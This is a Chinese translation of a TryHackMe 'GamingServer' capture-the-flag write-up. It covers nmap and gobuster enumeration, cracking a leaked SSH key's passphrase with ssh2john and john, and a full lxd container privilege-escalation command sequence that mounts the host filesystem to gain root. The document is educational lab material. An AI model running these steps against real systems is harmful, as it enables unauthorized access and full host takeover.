<html>
<head>
<title>TryHackMe: GamingServer Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe: GamingServer报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-gamingserver-write-up-53c64f995200?source=collection_archive---------2-----------------------#2020-10-27">https://infosecwriteups.com/tryhackme-gamingserver-write-up-53c64f995200?source=collection_archive---------2-----------------------#2020-10-27</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/75a397d20041bf4d2a60a07a672886df.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wV_LRhqCpIsnFV6Stz9V2w.png"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">初学者CTF挑战赛</figcaption></figure><p id="76e8" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这是一个THM初级挑战<a class="ae kz" href="https://tryhackme.com/room/gamingserver" rel="noopener ugc nofollow" target="_blank"> GamingServer </a>的特写。没有任何延迟，让我们连接到我们的THM OpenVPN网络，并启动我们的机器。</p><h2 id="5a2b" class="la lb it bd lc ld le dn lf lg lh dp li km lj lk ll kq lm ln lo ku lp lq lr ls bi translated">任务1 Boot2Root</h2><ol class=""><li id="bd5e" class="lt lu it kd b ke lv ki lw km lx kq ly ku lz ky ma mb mc md bi translated">使用Nmap扫描您的网络。</li></ol><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="b9ba" class="la lb it mj b gy mn mo l mp mq">nmap -A &lt;machine-ip&gt;</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mr"><img src="../Images/09d7551bab23d7ae82939330f2df6b10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FUwhDo3na-Qg2OQh-rYDAQ.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">Nmap扫描结果</figcaption></figure><p id="05a2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">2.有两个开放的端口。让我们看看HTTP(80)端口中有什么。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mw"><img src="../Images/f86e2dc392dd31a54864e57a7f216325.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WdgeYOWKwuo2VYp0R8q5vA.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">http页面</figcaption></figure><p id="cfa6" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">3.看起来像一个虚拟页面。但是我们可以通过inspect元素识别出一个名字“john”。所以让我们使用gobuster，找出这个网站隐藏的扩展。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="2e39" class="la lb it mj b gy mn mo l mp mq">gobuster dir -u http://&lt;machine-ip&gt; -w 'wordlist'</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mx"><img src="../Images/c193a3490328fdd83a6399085d62150d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RA-QqdUpIluSk9NIQ_tjCg.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">Gobuster扫描结果</figcaption></figure><p id="909d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">4.几个扩展名是可疑的“robots.txt”、“secret”、“uploads”。让我们逐一探索。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div class="gh gi my"><img src="../Images/5dd4cdcd7c588febaa5592082e78169a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*HFB8Py9CC5FnO8s2lHBezQ.png"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">秘密分机</figcaption></figure><figure class="me mf mg mh gt ju gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/3aa534163bc9480ce611676cad0a9409.png" data-original-src="https://miro.medium.com/v2/resize:fit:994/format:webp/1*79_mzhpm0bNjhbVu-W1e5Q.png"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">上传扩展</figcaption></figure><p id="8a55" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">5.我们可以找到一个列表文件，其中包含各种单词和一个RSA私钥，可用于ssh破解。</p><p id="a013" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">6.使用ssh2john让我们破解私钥并找到密码短语。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="85cf" class="la lb it mj b gy mn mo l mp mq">python3 ssh2john.py id_rsa &gt; hash</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi na"><img src="../Images/4bf2599332a901a78c18efc6649e4409.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZXSATB5Z_iYfgkEz4gxsoQ.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">ssh2john</figcaption></figure><p id="d891" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">7.得到散列后，使用john让我们用“dict.lst”单词表找到密码短语。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="6dd8" class="la lb it mj b gy mn mo l mp mq">john hash dict.lst</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nb"><img src="../Images/086ecd1f30028c1d5dd23e1ba059a9f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oMSzkBNNYv-RjvSArRkaGg.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">开膛手约翰扫描</figcaption></figure><p id="18ef" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">8.现在我们得到了密码短语。让我们打开ssh并获取标志。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="17ac" class="la lb it mj b gy mn mo l mp mq">ssh -i id_rsa john@&lt;machine-ip&gt;</span></pre><p id="7628" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">9.我们一打开外壳，就可以看到“user.txt”标志。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/e9cd04d26c7efce00bce06b8b1127145.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/1*0w9agXjjBkanlljEv2nRvw.png"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">用户标志</figcaption></figure><p id="ff93" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">10.现在，让我们得到根旗。因为我们不是根用户。我们无法进入根目录。我们必须提升我们的特权。</p><p id="4647" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">11.在查看用户时，我发现可以通过lxd权限提升来对外壳进行rooted。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nd"><img src="../Images/27625f971953c5fa4badc7e2800805cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*giLOYjgBSRKssXRoo16qOQ.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">用户组</figcaption></figure><p id="653b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">12.跟随这个步骤的是<a class="ae kz" href="https://github.com/saghul/lxd-alpine-builder.git" rel="noopener ugc nofollow" target="_blank">这个</a>。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="b2ac" class="la lb it mj b gy mn mo l mp mq">git clone <a class="ae kz" href="https://github.com/saghul/lxd-alpine-builder.git" rel="noopener ugc nofollow" target="_blank">https://github.com/saghul/lxd-alpine-builder.git</a></span><span id="54bd" class="la lb it mj b gy ne mo l mp mq">cd lxd-alpine-builder</span><span id="c5a5" class="la lb it mj b gy ne mo l mp mq">sudo ./build-alpine</span></pre><p id="79fd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">13.现在将压缩文件(alpine-v 3.12-x86 _ 64–2020 1 0 2 7 _ 1655 . tar . gz)传输到machine shell。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nf"><img src="../Images/95ff8d14d09114923361c1cefb20b51e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yii_mdS6wdM1OnulQtJRSw.png"/></div></div></figure><p id="4f04" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">14.请执行以下步骤。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="ea08" class="la lb it mj b gy mn mo l mp mq">lxc image import alpine-v3.12-x86_64-20201027_1655.tar.gz --alias=image</span><span id="dc80" class="la lb it mj b gy ne mo l mp mq">lxc init image hacked -c security.privileged=true</span><span id="4599" class="la lb it mj b gy ne mo l mp mq">lxc config device add hacked mydevice disk source=/ path=/mnt/root recursive=true</span><span id="e7e6" class="la lb it mj b gy ne mo l mp mq">lxc start hacked</span><span id="22cc" class="la lb it mj b gy ne mo l mp mq">lxc exec hacked /bin/sh</span></pre><figure class="me mf mg mh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ng"><img src="../Images/9223f6130e1560817196c1b5aee68381.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6o7vQnr7s0syQaz7nLx3og.png"/></div></div></figure><p id="78a9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">15.嘣！！！我们现在是根用户。进入/mnt/root/root目录获取根标志。</p><figure class="me mf mg mh gt ju gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/be5de9d0044e87bece76451385643b4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*PWZ871jfNpYvBFupubjZ6w.png"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">根标志</figcaption></figure></div><div class="ab cl ni nj hx nk" role="separator"><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn"/></div><div class="im in io ip iq"><p id="846b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">做这个挑战很有趣。希望大家学到新东西:)。</p><p id="d68a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">通过<a class="ae kz" href="https://www.linkedin.com/in/vishnuram-r/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>和我联系。</p></div></div>    
</body>
</html>